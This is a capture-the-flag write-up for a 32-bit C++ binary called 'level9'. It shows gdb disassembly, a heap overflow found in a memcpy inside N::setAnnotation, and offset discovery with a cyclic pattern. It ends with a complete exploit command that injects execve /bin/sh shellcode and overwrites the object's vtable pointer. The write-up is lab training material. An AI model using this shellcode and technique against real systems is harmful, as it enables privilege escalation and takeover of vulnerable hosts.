# level9
The program look like c++ code because a class is present: `N`

```bash
(gdb) info functions
```
```console
All defined functions:

Non-debugging symbols:

0x080485f4  main

0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
```
## Step 1

#### Main
```console
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
```

#### N::setAnnotation
```console
(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.
```

We understand that `argv[1]` is copied to the heap using `memcpy` through the calss method `N::setAnnotation`. this is vulnerable to buffer overflow because the size of `argv[1]` is not checked.


## Step 2
```bash
ltrace ./level9 AAAA
```
```console
__libc_start_main(0x80485f4, 2, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                                         = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                                      = 0
_Znwj(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280)                                                                                 = 0x804a008
_Znwj(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280)                                                                                          = 0x804a078
strlen("AAAA")                                                                                                                             = 4
memcpy(0x0804a00c, "AAAA", 4)                                                                                                              = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                                                    = 0xb7fce4a0
+++ exited (status 11) +++
```

`mempcy` write `argv[1]` at `0x0804a00c`

### Verification
Once here after `memcpy` call()

```bash
```console
=> 0x0804867c <+136>:	mov    0x10(%esp),%eax
```

```bash
(gdb) p/x *0x0804a00c
```
```console
$1 = 0x41414141
```

## Step 3
Overflow the buffer to see where we overwrite

It overwrite `eax` and `ecx` registers

Find the offset:

```console
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r 
eax            0x41366441	1094083649
ecx            0x67413567	1732326759
edx            0x804a0d4	134521044
ebx            0x804a078	134520952
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

`eax` is reached at 108

## Goal
- Put a shellcode at the begin of the buffer
- Change `eax` to return to the buffer

## Step 4
```bash
(gdb) r $(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * (108-21) + "\x0c\xa0\x04\x08"')
```

```console
Starting program: /home/user/level9/level9 $(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * (108-21) + "\x0c\xa0\x04\x08"')

Program received signal SIGSEGV, Segmentation fault.
0xe1f7c931 in ?? ()
```

It segfaults because the shellcode is not executed. Indeed it's dereferenced as a pointer. So it segfaults at the address `0xe1f7c931` which is the beginning of the shellcode.

### Solution
Derefence to an other address. We will simply dereference to the 4 next bytes of the buffer.


## Exploit
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * (108-25) + "\x0c\xa0\x04\x08"')
```

```console